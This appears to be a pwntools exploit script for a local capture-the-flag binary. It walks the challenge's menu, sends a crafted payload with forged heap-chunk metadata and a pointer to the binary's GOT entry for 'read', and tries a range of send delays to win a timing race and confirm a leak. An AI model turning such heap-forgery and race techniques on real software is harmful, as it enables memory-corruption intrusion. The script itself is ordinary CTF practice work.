from pwn import *
import re


context.binary = ELF("./attachments/pwn", checksec=False)
ld = "./attachments/ld-linux-x86-64.so.2"


def start():
    io = process([ld, "--library-path", "./attachments", "./attachments/pwn"])
    io.recvuntil(b"> ")
    return io


def menu(io, choice):
    io.sendline(str(choice).encode())


def prep(io):
    menu(io, 2)
    io.send(b"B" * 0x30)
    io.recvuntil(b"forge committed")
    io.recvuntil(b"> ")
    menu(io, 3)
    io.recvuntil(b"actuator ready")
    io.recvuntil(b"> ")
    menu(io, 1)
    io.sendlineafter(b"appeal target (0x20-0x78)> ", b"0x78")
    io.recvuntil(b"supremacy.\n")
    io.recvuntil(b"> ")


def make_payload():
    payload = bytearray(b"A" * 0x88)
    payload[:8] = b"sentinel"
    payload[0x30:0x38] = p64(0)
    payload[0x38:0x40] = p64(0x51)
    payload[0x50:0x54] = p32(0)
    payload[0x58:0x60] = p64(8)
    payload[0x60:0x68] = p64(context.binary.got["read"])
    return bytes(payload)


def try_wait(wait_s):
    io = start()
    try:
        prep(io)
        menu(io, 2)
        io.recvuntil(b"forge primer (1 byte)> ")
        sleep(wait_s)
        payload = make_payload()
        io.send(payload[:1])
        io.send(payload[1:])
        io.recvuntil(b"forge committed")
        io.recvuntil(b"> ")
        menu(io, 7)
        blob = io.recvuntil(b"> ")
        return b"lane=0 len=0x8" in blob
    except EOFError:
        return False
    finally:
        io.close()


def main():
    waits = [0.18, 0.20, 0.22, 0.24, 0.26, 0.28, 0.30]
    for wait_s in waits:
        hit = 0
        total = 20
        for _ in range(total):
            hit += int(try_wait(wait_s))
        print(wait_s, hit, total)


if __name__ == "__main__":
    main()
